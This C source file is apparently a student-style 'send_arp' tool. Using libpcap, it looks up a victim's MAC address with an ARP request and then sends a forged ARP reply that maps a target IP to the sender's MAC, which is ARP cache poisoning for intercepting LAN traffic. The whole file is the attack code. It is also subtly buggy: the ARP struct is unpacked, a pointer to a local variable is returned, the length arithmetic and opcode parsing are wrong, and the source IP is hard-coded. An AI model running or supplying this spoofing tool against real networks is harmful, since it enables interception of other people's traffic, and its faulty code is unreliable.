#include <arpa/inet.h>
#include <pcap.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>
#define arpType 0x0806
#define ipType 0x0800
#define OPCODE_REQUEST 0x0001
#define OPCODE_REPLY 0x0002
#define BUFSIZE 1000

struct Ethernet {
    u_char Dmac[6];
    u_char Smac[6];
    uint16_t etype;
};

struct Arp{
    uint16_t Hdtype;
    uint16_t Ptype;
    uint8_t Hsize;
    uint8_t Psize;
    uint16_t Opcode;
    u_char SenderMac[6];
    uint32_t SenderIp;
    u_char TargetMac[6];
    uint32_t TargetIp;
};

void usage(){
    printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
}

//get mac address//
u_char* getMacAddress(char *interface, u_char *uc_Mac)
{
       int fd;
       struct ifreq ifr;
       //char *interface = "enp0s3";
       u_char *mac;

       fd = socket(AF_INET, SOCK_DGRAM, 0);

       ifr.ifr_addr.sa_family = AF_INET;
       strncpy((char *)ifr.ifr_name , (const char *)interface , IFNAMSIZ-1);

       ioctl(fd, SIOCGIFHWADDR, &ifr);
       close(fd);

       mac = (u_char*)ifr.ifr_hwaddr.sa_data;
       return mac;
}

int main(int argc, char *argv[])
{
    unsigned char packet[1500];
    if(argc!=4){
        usage();
        return -1;
    }

    char *interface = argv[1];    // network interface
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(interface, BUFSIZE, 1, 1000, errbuf);
    if(handle == NULL){
        fprintf(stderr, "couldn't open device %s : %s\n", interface, errbuf);
    }

    struct Ethernet eth;
    struct Arp arp;

    int length = 0;

    memset(packet, 0, sizeof(packet));  // packet reset
    u_char *myMac;
    myMac = getMacAddress(interface, eth.Smac);

    memset(eth.Dmac, 0xff, 6);  // broadcast mac
    memcpy(eth.Smac, myMac, 6);   // memory copy My Mac address set
    eth.etype=ntohs(arpType);   // ARP header type set

    memcpy(packet, &eth, sizeof(eth));
    length+=sizeof(eth);

    uint32_t sip;   // source ip
    uint32_t tip;   // target ip
    uint32_t sender_ip; // sender ip

    sip=inet_addr("172.30.1.49");
    sender_ip=inet_addr(argv[2]);
    tip=inet_addr(argv[3]);

    memset(&arp, 0, sizeof(arp));

//request
    arp.Hdtype = ntohs(0x0001);
    arp.Ptype = ntohs(0x0800);
    arp.Hsize = 0x06;
    arp.Psize = 0x04;
    arp.Opcode=ntohs(OPCODE_REQUEST);   // request ARP set

    memcpy(arp.SenderMac, eth.Smac, 6);
    memcpy(&arp.SenderIp,&sip,4);
    memset(&arp.TargetMac, 0x00, 6);    // finding mac set

    memcpy(&arp.TargetIp,&sender_ip,4);

    memcpy(packet+length, &arp, sizeof(arp));
    length+=sizeof(eth);

    pcap_sendpacket(handle, packet, 42);    // ARP request packet send

//get target mac address//
    struct pcap_pkthdr* header;
    const u_char* pack;

    while(true){
        int res = pcap_next_ex(handle, &header, &pack);
        if(res == 0) continue;
        if(res == -1 || res == -2) break;

        arp.TargetMac[0]=pack[22];
        arp.TargetMac[1]=pack[23];
        arp.TargetMac[2]=pack[24];
        arp.TargetMac[3]=pack[25];
        arp.TargetMac[4]=pack[26];
        arp.TargetMac[5]=pack[27];
        arp.Opcode=pack[21];

        break;
    }

//reply
 if(ntohs(eth.etype) == arpType && arp.Opcode == OPCODE_REPLY){
        int length = 0;

        memset(packet, 0, sizeof(packet));
        myMac = getMacAddress(interface, eth.Smac);

        memcpy(eth.Dmac, arp.TargetMac, 6);
        memcpy(eth.Smac, myMac, 6);
        eth.etype=ntohs(arpType);

        memcpy(packet, &eth, sizeof(eth));
        length+=sizeof(eth);

        memset(&arp, 0,sizeof(arp));

        arp.Hdtype = ntohs(0x0001);
        arp.Ptype = ntohs(0x0800);
        arp.Hsize = 0x06;
        arp.Psize = 0x04;
        arp.Opcode=ntohs(OPCODE_REPLY); // reply ARP set

        memcpy(arp.SenderMac, &eth.Smac, 6);
        memcpy(&arp.SenderIp,&tip,4);
        memcpy(arp.TargetMac, &eth.Dmac, 6);
        memcpy(&arp.TargetIp, &sender_ip, 4);


        memcpy(packet+length, &arp, sizeof(arp));
        length+=sizeof(eth);

        pcap_sendpacket(handle, packet, 42);    // ARP reply packet send
        
    }
}

